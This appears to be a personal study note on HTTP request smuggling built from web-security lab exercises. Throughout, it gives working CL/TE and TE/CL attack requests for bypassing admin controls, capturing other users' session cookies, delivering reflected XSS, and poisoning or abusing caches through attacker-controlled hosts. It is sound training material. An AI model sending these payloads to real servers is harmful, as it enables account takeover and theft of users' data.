## Bypass front-end security controls

TE/CL:

<mark class="hltr-b">POST /home HTTP/1.1</mark>
<mark class="hltr-b">Host: vulnerable-website.com</mark>
<mark class="hltr-b">Content-Type: application/x-www-form-urlencoded</mark>
<mark class="hltr-b">Content-Length: 62</mark>
<mark class="hltr-b">Transfer-Encoding: chunked</mark>

<mark class="hltr-b">0</mark>

<mark class="hltr-r">GET /admin HTTP/1.1</mark>
<mark class="hltr-r">Host: vulnerable-website.com</mark>
<mark class="hltr-r">Foo: x</mark><mark class="hltr-g">GET /home HTTP/1.1</mark>
<mark class="hltr-g">Host: vulnerable-website.com</mark>

The front-end server see two requests, both for `/home`. Backend sees one request for `/home` and one for `/admin`. As they have passed through the front-end controls, and so grant access to the restricted URL.

Example CL/TE:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

## Revealing front-end request rewriting
For example, the front-end server might:
- terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
- add an `X-Forwarded-For` header containing the user's IP address;
- determine the user's ID based on their session token and add a header identifying the user; or
- add some sensitive information that is of interest for other attacks.

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

- Find a POST request that reflects the value of a request parameter into the application's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

Suppose an application has a login function that reflects the value of the `email` parameter:
```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```
response:
```html
<input id="email" value="wiener@normal-user.net" type="text">
```

**RS CL/TE:**
<mark class="hltr-b">POST / HTTP/1.1</mark>
<mark class="hltr-b">Host: vulnerable-website.com</mark>
<mark class="hltr-b">Content-Length: 130</mark>
<mark class="hltr-b">Transfer-Encoding: chunked</mark>

<mark class="hltr-b">0</mark>

<mark class="hltr-o">POST /login HTTP/1.1</mark>
<mark class="hltr-o">Host: vulnerable-website.com</mark>
<mark class="hltr-o">Content-Type: application/x-www-form-urlencoded</mark>
<mark class="hltr-o">Content-Length: 100</mark>

<mark class="hltr-o">email=</mark><mark class="hltr-g">POST /login HTTP/1.1</mark>
<mark class="hltr-g">Host: vulnerable-website.com</mark>
<mark class="hltr-g">...</mark>
**Response:**
```
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```
Complete example:
```http
POST / HTTP/1.1
Host: 0a120055047deebbb9562bdc00b10074.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```
Get header name in the response and perform attack request:
```http
POST / HTTP/1.1
Host: 0a120055047deebbb9562bdc00b10074.web-security-academy.net
Content-Length: 170
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-sGquJt-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1


```

## Bypassing client authentication
<mark class="hltr-b">POST /example HTTP/1.1</mark>
<mark class="hltr-b">Host: vulnerable-website.com</mark>
<mark class="hltr-b">Content-Type: x-www-form-urlencoded</mark>
<mark class="hltr-b">Content-Length: 64</mark>
<mark class="hltr-b">Transfer-Encoding: chunked</mark>

<mark class="hltr-b">0</mark>

<mark class="hltr-o">GET /admin HTTP/1.1</mark>
<mark class="hltr-o">X-SSL-CLIENT-CN: administrator</mark>
<mark class="hltr-o">Foo: x</mark>

## Capturing other users' requests
To perform the attack, you need to smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request.
```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```
Now consider what would happen if you smuggle an equivalent request with an overly long `Content-Length` header and the `comment` parameter positioned at the end of the request as follows:

<mark class="hltr-b">GET / HTTP/1.1</mark>
<mark class="hltr-b">Host: vulnerable-website.com</mark>
<mark class="hltr-b">Transfer-Encoding: chunked</mark>
<mark class="hltr-b">Content-Length: 330</mark>

<mark class="hltr-b">0</mark>

<mark class="hltr-o">POST /post/comment HTTP/1.1</mark>
<mark class="hltr-o">Host: vulnerable-website.com</mark>
<mark class="hltr-o">Content-Type: application/x-www-form-urlencoded</mark>
<mark class="hltr-o">Content-Length: 400</mark>
<mark class="hltr-o">Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO</mark>
<mark class="hltr-o">csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=</mark>

##### **User request with sensetive data**:
<mark class="hltr-o">POST /post/comment HTTP/1.1</mark>
<mark class="hltr-o">Host: vulnerable-website.com</mark>
<mark class="hltr-o">Content-Type: application/x-www-form-urlencoded</mark>
<mark class="hltr-o">Content-Length: 400</mark>
<mark class="hltr-o">Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO</mark>

<mark class="hltr-o">csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=</mark><mark class="hltr-g">GET / HTTP/1.1</mark>
<mark class="hltr-g">Host: vulnerable-website.com</mark>
<mark class="hltr-g">Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj</mark>
<mark class="hltr-g">...</mark> 
To capture more of the victim's request, you just need to increase the value of the smuggled request's `Content-Length` header accordingly, but note that this will involve a certain amount of trial and error. If you encounter a timeout, simply reduce the value until the attack works again.
Full example from lab:
```http
POST / HTTP/1.1
Host: 0ad2000304c8ee07bbeb6b8900390007.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 325

0

POST /post/comment HTTP/1.1
Host: 0ad2000304c8ee07bbeb6b8900390007.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 922
Cookie: session=sH30EmD6McpTdug248fdD35WRHPkBL61

csrf=kMwiSMiMLkk1hCJLXiVmAhUSg3PmtnR6&postId=2&name=Jan+Verner&email=xxx%40gmail.com&website=&comment=AA
```

## Exploit [[Reflected XSS]]
For example:
<mark class="hltr-b">POST / HTTP/1.1</mark>
<mark class="hltr-b">Host: vulnerable-website.com</mark>
<mark class="hltr-b">Content-Length: 63</mark>
<mark class="hltr-b">Transfer-Encoding: chunked</mark>

<mark class="hltr-b">0</mark>

<mark class="hltr-g">GET / HTTP/1.1</mark>
<mark class="hltr-g">User-Agent: <script>alert(1)</script></mark>
<mark class="hltr-g">Foo: X</mark>
Full example from lab solution:
```http
POST / HTTP/1.1
Host: 0a59009e03fa986a8017f3f00036009e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Transfer-Encoding: chunked

0

GET /post?postId=10 HTTP/1.1
User-Agent: "><img src=x onerror=alert(1) />
Foo: X
```

## Turn an on-site redirect into an open redirect
Many applications perform on-site redirects from one URL to another and place the hostname from the request's `Host` header into the redirect URL. An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash:

<mark class="hltr-b">POST / HTTP/1.1</mark>
<mark class="hltr-b">Host: vulnerable-website.com</mark>
<mark class="hltr-b">Content-Length: 54</mark>
<mark class="hltr-b">Transfer-Encoding: chunked</mark>

<mark class="hltr-b">0</mark>

<mark class="hltr-o">GET /home HTTP/1.1</mark>
<mark class="hltr-o">Host: attacker-website.com</mark>
<mark class="hltr-o">Foo: X</mark>
next request:
<mark class="hltr-o">GET /home HTTP/1.1</mark>
<mark class="hltr-o">Host: attacker-website.com</mark>
<mark class="hltr-o">Foo: X</mark><mark class="hltr-g">GET /scripts/include.js HTTP/1.1</mark>
<mark class="hltr-g">Host: vulnerable-website.com</mark>

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/

## Turning root-relative redirects into open redirects
```http
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```
Attack:
```http
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```

## Perform web [[Cache poisoning]]
Attacker's request:
<mark class="hltr-b">POST / HTTP/1.1</mark>
<mark class="hltr-b">Host: vulnerable-website.com</mark>
<mark class="hltr-b">Content-Length: 59</mark>
<mark class="hltr-b">Transfer-Encoding: chunked</mark>

<mark class="hltr-b">0</mark>

<mark class="hltr-o">GET /home HTTP/1.1</mark>
<mark class="hltr-o">Host: attacker-website.com</mark>
<mark class="hltr-o">Foo: X</mark><mark class="hltr-g">GET /static/include.js HTTP/1.1</mark>
<mark class="hltr-g">Host: vulnerable-website.com</mark>
Victim's request and response:
```http
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Full example from lab solution:
```http
POST / HTTP/1.1
Host: 0a7e001e0383fc0183ec191600700030.web-security-academy.net
Content-Length: 182
Transfer-Encoding: chunked
Accept: application/x-www-form-urlencoded

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-0a7b00f40348fcda830d1865010700d8.exploit-server.net
Content-Length: 10
Accept: application/x-www-form-urlencoded
Foo: x

x=1
```
poison request:
```http
GET /resources/js/tracking.js HTTP/1.1
Host: 0a7e001e0383fc0183ec191600700030.web-security-academy.net
```

## Perform web [[Cache deception]]

<mark class="hltr-b">POST / HTTP/1.1</mark>
<mark class="hltr-b">Host: vulnerable-website.com</mark>
<mark class="hltr-b">Content-Length: 43</mark>
<mark class="hltr-b">Transfer-Encoding: chunked</mark>

<mark class="hltr-b">0</mark>

<mark class="hltr-o">GET /private/messages HTTP/1.1</mark>
<mark class="hltr-o">Foo: X</mark>
The next request from another user that is forwarded to the back-end server will be append to the smuggled request, including sensetive cookies. For example:
<mark class="hltr-o">GET /private/messages HTTP/1.1</mark>
<mark class="hltr-o">Foo: X</mark><mark class="hltr-g">GET /static/some-image.png HTTP/1.1</mark>
<mark class="hltr-g">Host: vulnerable-website.com</mark>
<mark class="hltr-g">Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</mark>
<mark class="hltr-g">...</mark>
Front-end caches response with privates messages against the URL of static image:
```http
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```
The attacker then visits the static URL and receives the sensitive content that is returned from the cache. The attacker might need to fetch a large number of static URLs to discover the captured content.
Example from lab:
Request for deception cache:
```http
POST / HTTP/1.1
Host: 0a07005d04adf27880d926dd00300051.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Foo: x
```
Extract API Key from a cached request:
```http
GET /resources/js/tracking.js HTTP/2
Host: 0a07005d04adf27880d926dd00300051.web-security-academy.net

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 14
X-Cache: hit
Content-Length: 3780

...

API Key: ...
```